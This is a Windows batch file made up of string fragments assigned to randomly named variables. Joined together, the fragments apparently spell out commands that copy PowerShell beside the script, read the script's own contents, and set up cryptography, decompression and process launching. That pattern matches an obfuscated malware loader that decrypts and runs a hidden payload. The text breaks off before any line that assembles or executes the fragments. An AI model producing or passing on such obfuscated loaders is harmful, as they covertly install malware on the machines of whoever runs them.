@echo off
set "WBbhSWRpMd=ow"
set "JVSVDIpMzl=0\"
set "ypJmQEMGhZ=s\"
set "TnmYassqgZ=32"
set "YCxXEqKRjJ=xe"
set "BuLtXzjbXq= C"
set "KluSRFMtXb=in"
set "hPSONZuoXH=em"
set "aycanWbLUg=ll"
set "WlPBYfQhTj=rS"
set "aFNVUfCZxQ=co"
set "TBuRFrvgBP=po"
set "WMUhaxNZlF=we"
set "DjtOpqoiYT=he"
set "XhgObinYSY=:\"
set "uEiLaTGsCv=Sy"
set "peANlFTtXv=nd"
set "eXeOmLoCkw=py"
set "GWIflYeESm=Wi"
set "ElOnmAtBnR=\v"
set "geHLEKGzpw= /"
set "pyMqOEomkL=\W"
set "SLAXRwEDPk=1."
set "iIzCsIsSJE=rs"
set "joWccNmpMb=ll"
set "LidmXIStgu=Po"
set "UqBTclbSyX=.e"
set "MEunZIcCaj=ws"
set "GYsfAXeROM=we"
set "GHYDJUfiaL=y "
set "kGccXrrJrA=he"
set "pTbxbfUAmp=st"
set "ysuVBbHcxI=do"
set "xlRTmQquzV= %~dp0"
set "sdRsWxGiIe=cd"
set "yCUwpzTDsR=ress"
set "xTXUgHvsNQ=JU.I"
set "vYViVQwzIP=ewLi"
set "niWysuZUBn=Obje"
set "GICWBhXwKE=ptor"
set "vFxlpCswRT=('%~f0'"
set "PlwktrICsN=sion"
set "VDQUUsJltN=Secu"
set "ycQTHmeZuN=and "
set "NqXVuLtmDg=esMa"
set "rtDRDDwgiH=('da"
set "xbPsexaneL=.Con"
set "mVQzqfomYO=New-"
set "aBrSjvrMYn=p = "
set "OmsBvuZDXT=;$IB"
set "RfHARGkgjX=U.Pa"
set "dbWkWOILZb=rofi"
set "vCMbQorjEC= '')"
set "oEwmWWIzQs=$jWf"
set "nVkqnatWci=ss -"
set "kKWuwpFPpK=F'[-"
set "UTjMnIVVkn=tem."
set "xRXMpguXso=.Cry"
set "kEZMbyNBvV=tsWi"
set "MvPicbgFue=qBc."
set "JPXlxxoAiW=m.IO"
set "DTcjmKIpxh=sfX "
